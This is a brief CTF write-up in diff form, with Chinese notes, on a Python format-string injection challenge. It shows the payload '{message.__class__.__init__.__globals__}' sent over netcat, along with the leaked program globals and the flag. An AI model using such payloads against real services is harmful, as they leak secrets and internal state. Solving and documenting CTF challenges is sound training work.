@@ -1,0 +1,12 @@
+嘗試一下可以發現{}會中斷
+然後裡面可以放已有的值不會中斷{message}
+後續再找其中可以參考的參數位置
+
+ref: https://www.anquanke.com/post/id/170620
+
+[user@fedora ~]$ nc 01.linux.challenges.ctf.thefewchosen.com 59892
+pattern> {message.__class__.__init__.__globals__}
+count> 1
+Until next time! {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7734d77c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/main.py', '__cached__': None, 'dataclasses': <module 'dataclasses' from '/usr/local/lib/python3.10/dataclasses.py'>, 'errno': <module 'errno' (built-in)>, 'os': <module 'os' from '/usr/local/lib/python3.10/os.py'>, 'random': <module 'random' from '/usr/local/lib/python3.10/random.py'>, 'FLAG': 'TFCCTF{Th15_G1vEs_pr1ntf_v1b35}', 'Message': <class '__main__.Message'>, 'MESSAGES': [Thank you for using our service., Here is your pattern:, Until next time!], 'pattern': '{message.__class__.__init__.__globals__}', 'count': 1, 'final_pattern': '{message.__class__.__init__.__globals__}'}
+
+TFCCTF{Th15_G1vEs_pr1ntf_v1b35}
